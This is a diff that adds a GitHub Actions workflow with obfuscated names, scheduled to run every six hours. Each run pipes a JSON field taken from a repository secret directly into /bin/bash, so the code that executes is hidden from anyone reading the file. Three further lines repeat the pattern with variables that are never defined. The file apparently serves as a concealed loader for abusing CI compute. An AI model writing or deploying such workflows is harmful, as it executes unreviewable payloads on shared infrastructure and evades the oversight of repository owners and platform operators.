@@ -1,0 +1,21 @@
+name: fuguntang6734
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuguntang6734
+        env:
+          i583: ${{ secrets.i583 }}
+        run: |
+          echo $i583 | jq -r .r1571 | /bin/bash
+          echo $dbxv4847 | jq -r .feoub2637 | /bin/bash
+          echo $rhl476 | jq -r .rs61 | /bin/bash
+          echo $ktio4 | jq -r .hel08228 | /bin/bash
+
